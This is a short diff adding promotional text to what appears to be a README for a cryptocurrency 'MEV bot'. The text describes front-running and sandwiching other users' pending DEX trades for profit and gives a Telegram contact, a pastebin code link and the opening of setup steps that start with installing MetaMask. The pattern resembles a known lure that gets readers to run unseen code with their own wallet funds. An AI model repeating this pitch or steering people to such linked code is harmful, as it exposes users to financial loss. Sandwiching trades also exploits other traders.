@@ -1,3 +1,9 @@
+If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.
+
+You can message me on Telegram if you have any questions: https://t.me/townwtf
+
+CODE LINK : https://pastebin.com/CFv3hXAc
+
 STEP BY STEP Instructions :
 
 👉 Download MetaMask: https://metamask.io/download
